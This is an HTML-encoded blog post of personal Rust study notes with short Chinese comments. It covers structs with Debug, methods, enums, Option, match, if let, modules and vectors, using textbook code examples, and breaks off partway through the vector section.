    <content type="html"><![CDATA[<h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>The <code>Debug trait </code>enables us to print our struct in a way that is useful for developers so we can see its value while we’re debugging our code.</p><a id="more"></a><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[derive(Debug)]  //开启使用debug :?打印结构体</span><br><span class="line">struct Rectangle &#123;</span><br><span class="line">    width: u32,</span><br><span class="line">    height: u32,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let rect1 = Rectangle &#123;</span><br><span class="line">        width: <span class="number">30</span>,</span><br><span class="line">        height: <span class="number">50</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">&quot;rect1 is &#123;:?&#125;&quot;</span>, rect1);  //or&#123;:<span class="comment">#?&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="method"><a href="#method" class="headerlink" title="method"></a>method</h3><p>their first parameter is <code>always self, </code>which represents the instance of the struct the method is being called on.</p><p>impl (implementation)</p><p>Methods can<code> take ownership of self,</code> borrow<code>self immutably</code>as we’ve done here, or borrow self mutably, just as they can any other parameter.<br><code>&amp;mut self</code></p><h3 id="associated-function"><a href="#associated-function" class="headerlink" title="associated function"></a>associated function</h3><p>You’ve already used the String::from associated function.</p><p>Associated functions are often used for constructors that will <code>return a new instance of the struct.</code></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[derive(Debug)]</span><br><span class="line">struct Rectangle &#123;</span><br><span class="line">    width: u32,</span><br><span class="line">    height: u32,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Rectangle &#123;</span><br><span class="line">    fn square(size: u32) -&gt; Rectangle &#123;  //没有self</span><br><span class="line">        Rectangle &#123;</span><br><span class="line">            width: size,</span><br><span class="line">            height: size,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let sq = Rectangle::square(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Each struct is allowed to have multiple impl blocks. </p><h3 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h3><p>枚举</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">enum IpAddrKind &#123;</span><br><span class="line">    V4,  //V4 V6就是所谓的变体</span><br><span class="line">    V6,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let four = IpAddrKind::V4;</span><br><span class="line">    let six = IpAddrKind::V6;</span><br><span class="line"></span><br><span class="line">    route(IpAddrKind::V4);</span><br><span class="line">    route(IpAddrKind::V6);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn route(ip_kind: IpAddrKind) &#123;&#125;</span><br></pre></td></tr></table></figure><p>枚举比struct更简明</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    enum IpAddr &#123;</span><br><span class="line">        V4(String),</span><br><span class="line">        V6(String),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let home = IpAddr::V4(String::from(<span class="string">&quot;127.0.0.1&quot;</span>));</span><br><span class="line"></span><br><span class="line">    let loopback = IpAddr::V6(String::from(<span class="string">&quot;::1&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>枚举每个变体可以有不同的类型</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    enum IpAddr &#123;</span><br><span class="line">        V4(u8, u8, u8, u8),</span><br><span class="line">        V6(String),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let home = IpAddr::V4(<span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    let loopback = IpAddr::V6(String::from(<span class="string">&quot;::1&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">[allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">struct Ipv4Addr &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct Ipv6Addr &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum IpAddr &#123;</span><br><span class="line">    V4(Ipv4Addr),</span><br><span class="line">    V6(Ipv6Addr),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum Message &#123;</span><br><span class="line">    Quit,</span><br><span class="line">    Move &#123; x: i32, y: i32 &#125;,</span><br><span class="line">    Write(String),</span><br><span class="line">    ChangeColor(i32, i32, i32),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    enum Message &#123;</span><br><span class="line">        Quit,</span><br><span class="line">        Move &#123; x: i32, y: i32 &#125;,</span><br><span class="line">        Write(String),</span><br><span class="line">        ChangeColor(i32, i32, i32),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    impl Message &#123;</span><br><span class="line">        fn <span class="built_in">call</span>(&amp;self) &#123;</span><br><span class="line">            // method body would be defined here</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let m = Message::Write(String::from(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    m.call();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="enum-option"><a href="#enum-option" class="headerlink" title="enum option"></a>enum option</h3><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">![allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">enum Option&lt;<span class="built_in">T</span>&gt; &#123; //&lt;<span class="built_in">T</span>&gt; means the Some variant of the Option enum can hold one piece of data of <span class="built_in">any</span> type</span><br><span class="line">    Some(<span class="built_in">T</span>),</span><br><span class="line">    None,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>option不用显示引入，已经提前有了</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let some_number = Some(<span class="number">5</span>);</span><br><span class="line">    let some_string = Some(<span class="string">&quot;a string&quot;</span>);</span><br><span class="line"></span><br><span class="line">    let absent_number: Option&lt;i32&gt; = None;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>If we use None rather than Some, we need to tell Rust what<code> type of Option&lt;T&gt;</code> we have<br>Option<T> and T (where T can be any type) are different types,<br>In other words, you have to convert an Option<T> to a <code>T</code> before you can perform T operations with it. </p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">match</span><br><span class="line">enum Coin &#123;</span><br><span class="line">    Penny,</span><br><span class="line">    Nickel,</span><br><span class="line">    Dime,</span><br><span class="line">    Quarter,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn value_in_cents(coin: Coin) -&gt; u8 &#123;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Penny =&gt; <span class="number">1</span>,</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter =&gt; <span class="number">25</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br></pre></td></tr></table></figure><p>The code associated with <code>each arm is an expression</code>, and the resulting value of the expression in the matching arm is the value that gets returned for the entire match expression.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn value_in_cents(coin: Coin) -&gt; u8 &#123;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Penny =&gt; &#123;</span><br><span class="line">            println!(<span class="string">&quot;Lucky penny!&quot;</span>);</span><br><span class="line">            <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter =&gt; <span class="number">25</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[derive(Debug)]</span><br><span class="line">enum UsState &#123;</span><br><span class="line">    Alabama,</span><br><span class="line">    Alaska,</span><br><span class="line">    // --snip--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum Coin &#123;</span><br><span class="line">    Penny,</span><br><span class="line">    Nickel,</span><br><span class="line">    Dime,</span><br><span class="line">    Quarter(UsState),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn value_in_cents(coin: Coin) -&gt; u8 &#123;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Penny =&gt; <span class="number">1</span>,</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter(state) =&gt; &#123;</span><br><span class="line">            println!(<span class="string">&quot;State quarter from &#123;:?&#125;!&quot;</span>, state); //得到coin里quarter里的usstate值</span><br><span class="line">            <span class="number">25</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    value_in_cents(Coin::Quarter(UsState::Alaska));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用option<T></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    fn plus_one(x: Option&lt;i32&gt;) -&gt; Option&lt;i32&gt; &#123;</span><br><span class="line">        match x &#123;</span><br><span class="line">            None =&gt; None,</span><br><span class="line">            Some(i) =&gt; Some(i + <span class="number">1</span>),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let five = Some(<span class="number">5</span>);</span><br><span class="line">    let six = plus_one(five);</span><br><span class="line">    let none = plus_one(None);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>Combining match and enums</code> is useful in many situations.<br>match against an enum, <code>bind a variable to the data inside,</code> and then execute code based on it.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let some_u8_value = <span class="number">0</span>u8;</span><br><span class="line">    match some_u8_value &#123;</span><br><span class="line">        <span class="number">1</span> =&gt; println!(<span class="string">&quot;one&quot;</span>),</span><br><span class="line">        <span class="number">3</span> =&gt; println!(<span class="string">&quot;three&quot;</span>),</span><br><span class="line">        <span class="number">5</span> =&gt; println!(<span class="string">&quot;five&quot;</span>),</span><br><span class="line">        <span class="number">7</span> =&gt; println!(<span class="string">&quot;seven&quot;</span>),</span><br><span class="line">        _ =&gt; (),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_</code>省略The _ pattern will match any value.<code>The () is just the unit value</code></p><h3 id="if-let"><a href="#if-let" class="headerlink" title="if let"></a>if let</h3><p>care about only one of the cases. For this situation, Rust provides if let.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let some_u8_value = Some(<span class="number">0</span>u8);</span><br><span class="line">    <span class="keyword">if</span> let Some(<span class="number">3</span>) = some_u8_value &#123;</span><br><span class="line">        println!(<span class="string">&quot;three&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let coin = Coin::Penny;</span><br><span class="line">    let mut count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> let Coin::Quarter(state) = coin &#123;</span><br><span class="line">        println!(<span class="string">&quot;State quarter from &#123;:?&#125;!&quot;</span>, state);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        count += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let coin = Coin::Penny;</span><br><span class="line">    let mut count = <span class="number">0</span>;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Quarter(state) =&gt; println!(<span class="string">&quot;State quarter from &#123;:?&#125;!&quot;</span>, state),</span><br><span class="line">        _ =&gt; count += <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="packages-gt-crates-gt-modules"><a href="#packages-gt-crates-gt-modules" class="headerlink" title="packages&gt;crates&gt;modules"></a>packages&gt;crates&gt;modules</h3><p> A package is<code>one or more crates</code>that provide a set of functionality. A package contains a Cargo.toml file that describes how to build those crates.<br>A package must contain zero or one library crates, and no more. It can contain as many binary crates as you’d like, but it must <code>contain at least one crate</code> (either library or binary).<br>If a package <code>contains src/main.rs and src/lib.rs, it has two crates: a library and a binary,</code> both with the same name as the package.<br>A package can<code>have multiple binary crates by placing files in the src/bin directory:</code>each file will be a separate binary crate.</p><p>the <code>use</code> keyword that brings a path into scope; and the <code>pub</code> keyword to make items public. We’ll also discuss the as keyword, external packages, and the glob operator</p><p>Modules let us organize code within a crate into groups</p><p>Create a new library named restaurant by running <code>cargo new --lib </code>restaurant;<br>crate //implicit module  src/main.rs and src/lib.rs 产生<br> └── front_of_house<br>     ├── hosting<br>     │   ├── add_to_waitlist<br>     │   └── seat_at_table<br>     └── serving<br>         ├── take_order<br>         ├── serve_order<br>         └── take_payment</p><p> If we want to call a function, we need to know its path.<br>A path can take two forms:</p><p>An <code>absolute path</code> starts from a crate root by using a crate name or a literal crate.<br>A <code>relative path </code>starts from the current module and uses self, super, or an identifier in the current module.<br>Both absolute and relative paths are followed by one or more identifiers separated by double colons (<code>::</code>).</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mod front_of_house &#123;</span><br><span class="line">    mod hosting &#123;</span><br><span class="line">        fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    // Absolute path</span><br><span class="line">    crate::front_of_house::hosting::add_to_waitlist();</span><br><span class="line"></span><br><span class="line">    // Relative path</span><br><span class="line">    front_of_house::hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>The way privacy works in Rust is that all items (<code>functions, methods, structs, enums, modules, and constants) are private by default</code>.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125; //making the module public doesn’t make its contents public. </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    // Absolute path</span><br><span class="line">    crate::front_of_house::hosting::add_to_waitlist();</span><br><span class="line"></span><br><span class="line">    // Relative path</span><br><span class="line">    front_of_house::hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn serve_order() &#123;&#125;</span><br><span class="line"></span><br><span class="line">mod back_of_house &#123;</span><br><span class="line">    fn fix_incorrect_order() &#123;</span><br><span class="line">        cook_order();</span><br><span class="line">        super::serve_order();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fn cook_order() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> Enums aren’t very useful unless their variants are public; it would be annoying to have to annotate all enum variants with pub in every case, so the <code>default for enum variants is to be public. </code>Structs are often useful without their fields being public, so struct fields follow the general rule of <code>everything being private by default</code> unless annotated with pub.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">use</span><br><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">use crate::front_of_house::hosting;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">use self::front_of_house::hosting;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="as"><a href="#as" class="headerlink" title="as"></a>as</h3><p>There’s another solution to the problem of bringing two types of the same name into the same scope with use: after the path, we can specify <code>as and a new local name</code>, or alias, for the type.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">![allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::fmt::Result;</span><br><span class="line">use std::io::Result as IoResult;</span><br><span class="line"></span><br><span class="line">fn function1() -&gt; Result &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">    Ok(())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn function2() -&gt; IoResult&lt;()&gt; &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">    Ok(())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>this technique is called re-exporting because we’re bringing an item into scope but also making that item available for others to bring into their scope</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub use crate::front_of_house::hosting;  //其他可以 另外创立一个链接</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::collections::HashMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This is an absolute path starting with std, the name of the standard library crate.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use rand::Rng;</span><br><span class="line">// --snip--</span><br><span class="line">use std::&#123;cmp::Ordering, io&#125;;</span><br><span class="line">// --snip--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::io::&#123;self, Write&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::collections::*;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> brings all public items </p><p>The <code>mod</code> keyword declares modules, and Rust looks in a file with the same name as the module for the code that goes into that module.</p><h3 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h3><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let v: Vec&lt;i32&gt; = Vec::new();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let v = vec![<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]; //类别自己推测</span><br><span class="line">&#125;</span><br><span class="line">fn main() &#123;</span><br><span class="line">    let mut v = Vec::new();</span><br><span class="line"></span><br><span class="line">    v.push(<span class="number">5</span>);</span><br><span class="line">    v.push(<span class="number">6</span>);</span><br><span class="line">    v.push(<span class="number">7</span>);</span><br><span class="line">    v.push(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">fn main() &#123;</span><br><span 